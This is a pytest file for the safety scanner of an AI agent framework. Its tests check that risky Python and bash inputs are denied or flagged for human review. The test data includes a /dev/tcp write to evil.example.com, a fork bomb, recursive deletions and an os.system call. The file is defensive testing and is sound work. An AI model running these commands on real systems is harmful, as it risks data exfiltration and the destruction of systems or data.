# Tencent is pleased to support the open source community by making trpc-agent-python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# trpc-agent-python is licensed under the Apache License Version 2.0
"""Tests for dual-path imports, env policy, register_rule, and opt-in hooks."""
from __future__ import annotations

import asyncio
from pathlib import Path
from unittest.mock import MagicMock

import pytest
from typing_extensions import override

from trpc_agent_sdk.safety import PolicyConfig
from trpc_agent_sdk.safety import RiskLevel
from trpc_agent_sdk.safety import SafetyFinding
from trpc_agent_sdk.safety import SafetyRule
from trpc_agent_sdk.safety import SafetyScanner
from trpc_agent_sdk.safety import ScanInput
from trpc_agent_sdk.safety import clear_custom_rules
from trpc_agent_sdk.safety import register_rule
from trpc_agent_sdk.safety import unregister_custom_rule


def test_tools_safety_reexport():
    """Official tools.safety path re-exports the same API when tools package is importable.

    Importing ``trpc_agent_sdk.tools.*`` executes tools/__init__.py which may
    require optional model deps (e.g. anthropic). In minimal installs the
    re-export module file still exists and is validated via importlib.
    """
    try:
        from trpc_agent_sdk.tools.safety import PolicyConfig as P2
        from trpc_agent_sdk.tools.safety import SafetyScanner as S2
        from trpc_agent_sdk.tools.safety import Decision
    except ModuleNotFoundError as ex:
        # Minimal env without anthropic etc.: verify the re-export module source.
        reexport = Path(__file__).resolve().parents[2] / "trpc_agent_sdk" / "tools" / "safety" / "__init__.py"
        assert reexport.is_file()
        text = reexport.read_text(encoding="utf-8")
        assert "trpc_agent_sdk.safety" in text
        pytest.skip(f"tools package not fully importable: {ex}")

    assert P2.__name__ == "PolicyConfig"
    report = S2(PolicyConfig()).scan(ScanInput(script="print(1)", language="python"))
    assert report.decision == Decision.ALLOW


def test_policy_from_env_default(monkeypatch):
    monkeypatch.delenv("TOOL_SAFETY_POLICY_PATH", raising=False)
    p = PolicyConfig.from_env()
    assert p.whitelisted_domains == []


def test_policy_from_env_path(monkeypatch, policy_path):
    monkeypatch.setenv("TOOL_SAFETY_POLICY_PATH", str(policy_path))
    p = PolicyConfig.from_env()
    assert "api.github.com" in p.whitelisted_domains


def test_register_rule_decorator():
    clear_custom_rules()

    @register_rule
    class _DecoRule(SafetyRule):
        rule_id = "TEST_DECO_001"
        rule_name = "deco"
        risk_type = "test"
        default_level = RiskLevel.LOW

        def check(self, scan_input, policy):
            return [
                SafetyFinding(
                    rule_id=self.rule_id,
                    rule_name=self.rule_name,
                    risk_type=self.risk_type,
                    risk_level=self.default_level,
                    evidence="deco",
                    recommendation="test",
                )
            ]

    try:
        scanner = SafetyScanner(PolicyConfig())
        assert any(r.rule_id == "TEST_DECO_001" for r in scanner.rules)
    finally:
        unregister_custom_rule("TEST_DECO_001")
        clear_custom_rules()


def test_r007_code_execution_eval():
    report = SafetyScanner(PolicyConfig()).scan(ScanInput(script="eval('1+1')", language="python"))
    assert report.decision.value == "deny"
    assert "R007_code_execution" in report.rule_ids or "R003_process_system" in report.rule_ids


def test_find_delete_and_xargs():
    s = SafetyScanner(PolicyConfig())
    r1 = s.scan(ScanInput(script="find /tmp -name '*.log' -delete", language="bash"))
    r2 = s.scan(ScanInput(script="find . -name '*.tmp' | xargs rm -rf", language="bash"))
    assert r1.decision.value == "deny"
    assert r2.decision.value == "deny"


def test_dev_tcp_and_fork_bomb():
    s = SafetyScanner(PolicyConfig())
    r1 = s.scan(ScanInput(script="echo x > /dev/tcp/evil.example.com/443", language="bash"))
    r2 = s.scan(ScanInput(script=":(){ :|:& };:", language="bash"))
    assert r1.decision.value == "deny"
    assert r2.decision.value == "deny"


def test_safe_bash_samples_allow(samples_dir):
    s = SafetyScanner(
        PolicyConfig.from_yaml(Path(__file__).resolve().parents[2] / "examples/tool_safety/tool_safety_policy.yaml"))
    for name in ("30_safe_bash.sh", "31_safe_find_grep.sh", "01_safe_python.py"):
        script = (samples_dir / name).read_text(encoding="utf-8")
        lang = "python" if name.endswith(".py") else "bash"
        report = s.scan(ScanInput(script=script, language=lang, tool_name=name))
        assert report.decision.value == "allow", (name, report.decision, report.rule_ids)


def test_bash_tool_enable_safety_guard_signature():
    """BashTool accepts enable_safety_guard without requiring anthropic at import of safety."""
    # Importing BashTool pulls tools package which may need anthropic in this env.
    try:
        from trpc_agent_sdk.tools.file_tools._bash_tool import BashTool
    except Exception as ex:  # pylint: disable=broad-except
        pytest.skip(f"BashTool not importable: {ex}")

    tool = BashTool(enable_safety_guard=False)
    assert tool.name == "Bash"
    # Enabling attaches a filter when ToolSafetyFilter is available.
    try:
        tool2 = BashTool(enable_safety_guard=True)
    except Exception as ex:  # pylint: disable=broad-except
        pytest.skip(f"enable_safety_guard requires filter stack: {ex}")
    assert any(getattr(f, "_name", None) == "tool_safety_filter" for f in tool2.filters)


def test_unsafe_local_code_executor_safety_fields():
    try:
        from trpc_agent_sdk.code_executors.local._unsafe_local_code_executor import (
            UnsafeLocalCodeExecutor, )
        from trpc_agent_sdk.code_executors import CodeExecutionInput
    except Exception as ex:  # pylint: disable=broad-except
        pytest.skip(f"code executor not importable: {ex}")

    ex = UnsafeLocalCodeExecutor(enable_safety_guard=True)
    assert ex.enable_safety_guard is True
    assert ex._safety_scanner is not None
    result = asyncio.run(ex.execute_code(None, CodeExecutionInput(code="import os\nos.system('id')")))
    assert "TOOL_SAFETY_DENY" in result.output


def test_unsafe_local_code_executor_multi_block_aggregates_review():
    """Regression for AI Code Review critical: multi-block [safe_python, bash
    'sleep 100 &'] must NOT keep worst=ALLOW. With block_on_review=True the
    executor must block and emit TOOL_SAFETY_NEEDS_REVIEW."""
    try:
        from trpc_agent_sdk.code_executors.local._unsafe_local_code_executor import (
            UnsafeLocalCodeExecutor, )
        from trpc_agent_sdk.code_executors import CodeExecutionInput
        from trpc_agent_sdk.code_executors import CodeBlock
    except Exception as ex:  # pylint: disable=broad-except
        pytest.skip(f"code executor not importable: {ex}")

    ex = UnsafeLocalCodeExecutor(enable_safety_guard=True, safety_block_on_review=True)
    inp = CodeExecutionInput(code_blocks=[
        CodeBlock(language="python", code="x = 1\nprint(x)"),
        CodeBlock(language="bash", code="sleep 100 &"),
    ])
    result = asyncio.run(ex.execute_code(None, inp))
    # MUST be blocked (not run) and labeled as NEEDS_REVIEW, not DENY.
    assert "TOOL_SAFETY_NEEDS_REVIEW" in result.output
    assert "TOOL_SAFETY_DENY" not in result.output


def test_unsafe_local_code_executor_review_label_differs_from_deny():
    """When block_on_review=True and decision is NEEDS_HUMAN_REVIEW, stderr
    must say TOOL_SAFETY_NEEDS_REVIEW, not TOOL_SAFETY_DENY (consistency with
    ToolSafetyFilter). Single-block 'sleep 100 &' triggers MEDIUM/review."""
    try:
        from trpc_agent_sdk.code_executors.local._unsafe_local_code_executor import (
            UnsafeLocalCodeExecutor, )
        from trpc_agent_sdk.code_executors import CodeExecutionInput
    except Exception as ex:  # pylint: disable=broad-except
        pytest.skip(f"code executor not importable: {ex}")

    ex = UnsafeLocalCodeExecutor(enable_safety_guard=True, safety_block_on_review=True)
    result = asyncio.run(ex.execute_code(None, CodeExecutionInput(code="sleep 100 &")))
    assert "TOOL_SAFETY_NEEDS_REVIEW" in result.output
    assert "TOOL_SAFETY_DENY" not in result.output


# ---------------------------------------------------------------------------
# BashTool enable_safety_guard integration: real filter chain via run_async.
# A stub _run_async_impl records calls so we can assert the filter actually
# blocked (impl never runs) or allowed (impl runs) without executing commands.
# ---------------------------------------------------------------------------


def _make_stub_bash_tool(tmp_path: Path, *, block_on_review: bool = False):
    """Build a BashTool subclass whose _run_async_impl records calls and returns a dict."""
    from trpc_agent_sdk.tools.file_tools._bash_tool import BashTool

    class _StubBash(BashTool):
        def __init__(self, **kwargs):
            super().__init__(**kwargs)
            self.calls = []

        @override
        async def _run_async_impl(self, *, tool_context, args):
            self.calls.append(args.get("command", ""))
            return {
                "success": True,
                "stdout": "stub-output",
                "stderr": "",
                "return_code": 0,
                "command": args.get("command", ""),
            }

    return _StubBash(
        cwd=str(tmp_path),
        enable_safety_guard=True,
        safety_audit_path=str(tmp_path / "audit.jsonl"),
        safety_block_on_review=block_on_review,
    )


def _make_mock_tool_context():
    """Minimal InvocationContext mock for BaseTool.run_async filter chain."""
    from trpc_agent_sdk.context import InvocationContext

    ctx = MagicMock(spec=InvocationContext)
    ctx.agent_context = MagicMock()
    ctx.agent = MagicMock()
    ctx.agent.before_tool_callback = None
    ctx.agent.after_tool_callback = None
    return ctx


async def _run_bash_tool(tool, command):
    """Drive BashTool.run_async via asyncio.run (env lacks pytest-asyncio)."""
    ctx = _make_mock_tool_context()
    return await tool.run_async(tool_context=ctx, args={"command": command})


def test_bash_tool_safety_guard_blocks_deny(tmp_path: Path):
    """DENY command must be blocked by the real filter chain: the stub impl
    must NOT run, and the result must carry error=TOOL_SAFETY_DENY."""
    try:
        from trpc_agent_sdk.tools.file_tools._bash_tool import BashTool  # noqa: F401
    except Exception as ex:  # pylint: disable=broad-except
        pytest.skip(f"BashTool not importable: {ex}")

    tool = _make_stub_bash_tool(tmp_path)
    result = asyncio.run(_run_bash_tool(tool, "rm -rf /tmp/never"))
    assert isinstance(result, dict)
    assert result.get("success") is False
    assert result.get("error") == "TOOL_SAFETY_DENY"
    assert tool.calls == []  # impl must not run when DENY


def test_bash_tool_safety_guard_allows_safe(tmp_path: Path):
    """ALLOW command must reach the stub impl and return its dict unchanged."""
    try:
        from trpc_agent_sdk.tools.file_tools._bash_tool import BashTool  # noqa: F401
    except Exception as ex:  # pylint: disable=broad-except
        pytest.skip(f"BashTool not importable: {ex}")

    tool = _make_stub_bash_tool(tmp_path)
    result = asyncio.run(_run_bash_tool(tool, "echo hello"))
    assert isinstance(result, dict)
    assert result.get("stdout") == "stub-output"
    assert tool.calls == ["echo hello"]


def test_bash_tool_safety_guard_review_warning_merged(tmp_path: Path):
    """Non-blocking NEEDS_HUMAN_REVIEW must run the impl AND merge the
    safety_warning fields into the returned dict via _after."""
    try:
        from trpc_agent_sdk.tools.file_tools._bash_tool import BashTool  # noqa: F401
    except Exception as ex:  # pylint: disable=broad-except
        pytest.skip(f"BashTool not importable: {ex}")

    # block_on_review=False (default): review does not block, warning is merged.
    tool = _make_stub_bash_tool(tmp_path, block_on_review=False)
    # 'sleep 100 &' ends with '&' (not '&&') and sleep is not a net command →
    # the background-process rule (R003) fires at MEDIUM → NEEDS_HUMAN_REVIEW
    # under the default policy. We do NOT assert a specific rule id here so
    # the test stays robust to which rule fires first; the contract being
    # tested is that the warning fields are merged into the dict result.
    result = asyncio.run(_run_bash_tool(tool, "sleep 100 &"))
    assert isinstance(result, dict)
    assert result.get("stdout") == "stub-output"  # impl ran
    assert result.get("safety_warning") == "TOOL_SAFETY_NEEDS_REVIEW"
    assert result.get("safety_risk_level") == "medium"
    assert len(result.get("safety_rule_ids", [])) > 0
